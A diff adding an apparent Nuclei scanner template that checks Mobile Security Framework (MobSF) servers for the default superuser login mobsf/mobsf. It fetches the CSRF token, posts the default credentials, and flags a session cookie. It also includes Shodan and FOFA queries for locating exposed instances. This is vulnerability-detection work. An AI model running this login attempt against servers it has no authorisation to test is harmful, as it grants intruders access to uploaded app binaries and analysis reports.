@@ -1,0 +1,76 @@
+id: mobsf-default-login
+
+info:
+  name: MobSF - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Mobile Security Framework (MobSF) 4.0.7 and later creates the superuser mobsf with the password mobsf in the official Docker image and in setup.sh. An attacker who logs in with these credentials can read uploaded mobile application binaries and analysis reports and start new scans.
+  reference:
+    - https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/v4.6.4/README.md
+    - https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/v4.6.4/Dockerfile
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    vendor: mobsf
+    product: mobsf
+    shodan-query: http.html:"Mobile Security Framework - MobSF"
+    fofa-query: body="Mobile Security Framework - MobSF"
+  tags: mobsf,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "Mobile Security Framework - MobSF", "csrfmiddlewaretoken", "name=\"password\"")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: csrfmiddlewaretoken
+        part: body
+        group: 1
+        regex:
+          - 'name="csrfmiddlewaretoken" value="([^"]+)"'
+        internal: true
+
+  - raw:
+      - |
+        POST /login/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/login/
+
+        csrfmiddlewaretoken={{csrfmiddlewaretoken}}&username={{username}}&password={{password}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - mobsf
+      password:
+        - mobsf
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 302'
+          - 'contains(header, "sessionid=")'
+          - 'regex("(?mi)^location:\\s*/\\s*$", header)'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
